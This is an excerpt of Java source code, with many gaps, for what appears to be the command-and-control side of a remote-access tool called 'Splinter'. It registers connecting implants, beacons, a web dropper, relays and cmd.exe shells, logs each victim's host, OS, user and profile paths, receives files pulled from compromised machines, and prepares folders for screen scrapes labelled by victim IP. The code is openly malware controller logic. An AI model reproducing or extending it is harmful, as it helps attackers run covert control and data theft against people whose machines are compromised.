...
public class Thread_Terminal extends Thread implements Runnable, ActionListener
{
	...
	public static volatile File_Transfer FILE_TRANFER_THD = new File_Transfer(true, false);
	...
	public boolean readLineFromSocket()
	{
		try
		{
			...
			if(executeShortcut(inputLine))
			{
				//shortcut took care of the command. exit out
				processInterrupt = true;//release the semaphore
				return true;
			}
			
			//otherwise, pop the first instruction, and send it to determine command
			else if(inputLine.trim().startsWith(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION) || inputLine.trim().startsWith(myUniqueDelimiter) || inputLine.startsWith(Driver.SPLINTER_DELIMETER_OPEN))
			{
	...
	/**
	 * Special message displayed on controller
	 */
	public boolean controllerMessage(String msg)
	{
		try
		{
			Drivers.txtpne_broadcastMessageBoard.appendString(true, "NOTE --> ", msg, Drivers.clrBackground, Drivers.clrImplant);
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("controllerMessage", this.strMyClassName, e, "", false);
		}
	...
	private boolean executeShortcut(String line)
	{
		try
		{
			/******************************************************************************
			 * PUT FILE OVERHEAD (Receive File from Connected Agent) 
			 ******************************************************************************/
			if(line.trim().startsWith(File_Transfer.PUT_FILE_OVERHEAD))
			{
				//query to accept this file
				String [] array = line.split(Driver.delimeter_1);
				...
				{										
					...
					controllerMessage("Setting up to receive file: " + filename_and_extension + " from Agent: [" + this.getId() + "] " + myVictim_RHOST_IP);
				}
				
				else
				{
					
					if(Driver.jop_Confirm("Agent: [" + this.getId() + "] " + myVictim_RHOST_IP + " Would like to send file:\nFile Name: " + filename_and_extension + "\nSize: " + expected_file_size + " (bytes)\n\nDo you wish to accept this file?", "Accept File?") == JOptionPane.YES_OPTION)
					{
						//add the identifier to the acceptable file list
						File_Transfer.ACCEPTABLE_FILE.add(new File_Transfer(identifier, filename_and_extension, destination_directory, expected_file_size, execute_uopn_completion, execution_parameters, pwOut));
						
						//NOTIFY CONTROLLER GUI
						controllerMessage("Setting up to receive file: " + filename_and_extension + " from Agent: [" + this.getId() + "] " + myVictim_RHOST_IP);
					...
					{
						//user declined to accept file						
						//this.sendCommand_RAW("REJECT_FILE" + Driver.delimeter_1 + identifier);
						return true;
					}
			 ...
			 ******************************************************************************/
			else if(line.trim().startsWith(File_Transfer.PUT_FILE))
			{
				...
				if(!FILE_TRANFER_THD.put_file(array[1], array[2]))
				{
					...
					Driver.sop("Unauthorized File Transfer coming in from Agent: [" + this.getId() + "] " + myVictim_RHOST_IP + " I AM NOT saving the contents to disk");
				}
			 ...
			 ******************************************************************************/
			else if(line.trim().startsWith(File_Transfer.CLOSE_FILE))
			{
				//only data witin the accept tree should be written to. otherwise, it was unauthorized so report it
				...
				{
					//file transfer is coming, but not authorized!
					this.controllerMessage("File save complete received from Agent: [" + this.getId() + "] " + myVictim_RHOST_IP + " saved to -->" + savedFile);
				}
				else
				{
					//otherwise, it was either never authorized to begin with, or an error occurred!
				}
...
//return true;
			...
			/**********************************************************************************************
	  		 ...
	  		 *********************************************************************************************/
			else if(strFirstLine != null && (strFirstLine.trim().startsWith(Driver.SPLINTER_BEACON_INITIAL_REGISTRATION) /*|| strFirstLine.trim().startsWith(myUniqueDelimeter)*/))
			{
	  		 ...
	  		 *********************************************************************************************/
	  		else if(strFirstLine != null && (strFirstLine.trim().startsWith(Driver.SPLINTER_BEACON_RESPONSE_HEADER)))
			{
	  			i_am_Beacon_Agent = true;
			...
			/**********************************************************************************************
	  		 * SPLINTER - IMPLANT 
	  		 *********************************************************************************************/
	  		else if(strFirstLine != null && (strFirstLine.trim().startsWith(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION) /*|| strFirstLine.trim().startsWith(myUniqueDelimeter)*/))
			{
	  		 ...
	  		 * SPLINTER - CONTROLLER 
	  		 *********************************************************************************************/
	  		else if(strFirstLine != null && (strFirstLine.trim().startsWith(Driver.CONTROLLER_INITIAL_REGISTRATION))) 
			{	  			
				if(!determineCommand(strFirstLine))
				{
					//error on line received, thus display what we received on the main terminals
	  		...
	  		/**********************************************************************************************
	  		 * SPLINTER - WEB Dropper 
	  		 *********************************************************************************************/
	  		else if(strFirstLine != null && (strFirstLine.trim().startsWith(Driver.WEB_DROPPER))) 
			{	  			
				//determineCommand(OS Enumeration)
	  			I_have_an_important_message = "";//clear the field to state we're done interrogating
	  			Drivers.alTerminals.add(this);				
				Drivers.updateConnectedImplants();
				Drivers.jtblConnectedImplants.updateJTable = true;
				...
				myImplantName = Driver.WEB_DROPPER;
				
				String [] array = strFirstLine.split(Driver.delimeter_1);
				
				try
				{
					this.myHostName =  array[1].trim();
					this.myOS = array[2].trim();
					this.myVersionNumber = array[3].trim();
					this.myUserName = array[4].trim();
					this.myHomeDrive = array[5].trim();
					this.myUserProfile = array[6].trim();
					this.myTempPath = array[7].trim();
				}
				catch(Exception ee){Driver.sop("Could not fully acquire enumeration of remote system for " + Driver.WEB_DROPPER + "[" + this.getId() + "]");}
				
				Drivers.sop("<< - - - >> Well lookie here! Looks like we have a " + myImplantName + " connected!  <<<<< -- >>>>> confidence: 100%.  Setting up the environment to handle this type of implant");
	  		 ...
	  		 *********************************************************************************************/
	  		else if(strFirstLine != null && (strFirstLine.trim().startsWith(Driver.RELAY_INITIAL_REGISTRATION_BRIDGE))) 
			{	  			
				if(!determineCommand(strFirstLine))
				{
					//error on line received, thus display what we received on the main terminals
	  		 ...
	  		 *********************************************************************************************/
	  		else if(strFirstLine != null && (strFirstLine.trim().startsWith(Driver.RELAY_INITIAL_REGISTRATION_PROXY))) 
			{	  			
				if(!determineCommand(strFirstLine))
				{
					//error on line received, thus display what we received on the main terminals
			...
			//check if the agent bindsd to cmd.exe command prompt on a windows machine
	  		else if(strFirstLine != null && strFirstLine.contains(WINDOWS_COMMAND_PROMPT_HEADER_STRING))
			{
			...
			{
				//unknown agent, but throw an exception to handle it for us
				throw new NullPointerException("Agent Not Found");
		...
		catch(NullPointerException ife)
		{
			//add self to arraylist
			if(Drivers.alTerminals != null)
				Drivers.alTerminals.add(this);
	...
	public File configureEnvironmentForScreenScrape(String FolderName)
	{
		try
		{
			...
			*/
			...
			if(Driver.fleFTP_FileHiveDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
				this.fleMySaveDirectory = new File(Driver.fleFTP_FileHiveDirectory.getCanonicalPath() + this.myVictim_RHOST_IP + "_" + FTP_ServerSocket.PORT);
			else
				this.fleMySaveDirectory = new File(Driver.fleFTP_FileHiveDirectory.getCanonicalPath() + Driver.fileSeperator + myVictim_RHOST_IP + "_" + FTP_ServerSocket.PORT);
